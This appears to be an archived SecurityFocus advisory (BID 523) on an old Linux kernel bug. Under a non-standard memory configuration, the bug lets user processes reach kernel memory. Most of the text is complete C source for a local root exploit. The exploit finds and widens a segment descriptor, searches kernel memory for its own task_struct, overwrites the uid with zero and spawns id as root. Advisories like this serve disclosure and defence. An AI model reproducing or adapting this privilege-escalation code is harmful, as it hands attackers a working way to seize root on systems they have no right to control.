source: http://www.securityfocus.com/bid/523/info

This vulnerability has to do with the division of the address space between a user process and the kernel. Because of a bug, if you select a non-standard memory configuration, sometimes user level processes may be given access upto 252Mb of memory that are really part of the kernel. This allows the process to first search for its memory descriptor and then extend it to cover the rest of the kernel memory. It can then search for a task_struct and modify it so its uid is zero (root). This vulnerability is very obscure, only works on that version of linux, and only if you select a non-standard memory configuration.


The exploit (local root, can be extended to also reset securelevel;
will only compile with libc 5, you'd have to rip task_struct out of
<linux/sched.h> for compiling with glibc):

#define __KERNEL__
#include <linux/sched.h>
#undef __KERNEL__
#include <unistd.h>
#include <grp.h>
#include <stdio.h>
#include <signal.h>
#include <sys/resource.h>

void die1()
{
        puts("\nFailed: probably not vulnerable");
        exit(1);
}

void die2()
{
        puts("\nVulnerable, but failed to exploit");
        exit(1);
}

int main()
{
        int *sp = (int *)&sp;
        int *d = sp;
        struct task_struct *task = (struct task_struct *)sp;
        int pid, uid;
        struct rlimit old, new;

        setbuf(stdout, NULL);
        printf("Searching for the descriptor... ");

        signal(SIGSEGV, die1);

        while ((d[0] & 0xFFF0FFFF) != 0x00C0FB00 &&
                (d[2] & 0xFFF0FFFF) != 0x00C0F300) d++;

        signal(SIGSEGV, die2);

        printf("found at %p\nExtending its limit... ", d + 2);

        d[2] |= 0xF0000;

        printf("done\nSearching for task_struct... ");

        pid = getpid();
        uid = getuid();

        if (getrlimit(RLIMIT_FSIZE, &old)) {
                perror("getrlimit");
                return 1;
        }

 search:
        new = old; new.rlim_cur--;
        if (setrlimit(RLIMIT_FSIZE, &new))
                new.rlim_cur = old.rlim_cur;

        do {
                ((int *)task)++;
        } while (task->pid != pid || task->uid != uid);

        if (task->rlim[RLIMIT_FSIZE].rlim_cur != new.rlim_cur) goto search;

        if (setrlimit(RLIMIT_FSIZE, &old)) {
                perror("setrlimit");
                return 1;
        }

        if (task->rlim[RLIMIT_FSIZE].rlim_cur != old.rlim_cur) goto search;

        printf("found at %p\nPatching the UID... ", task);

        task->uid = 0;
        setuid(0);
        setgid(0);
        setgroups(0, NULL);

        puts("done");

        execl("/usr/bin/id", "id", NULL);
        return 1;
}
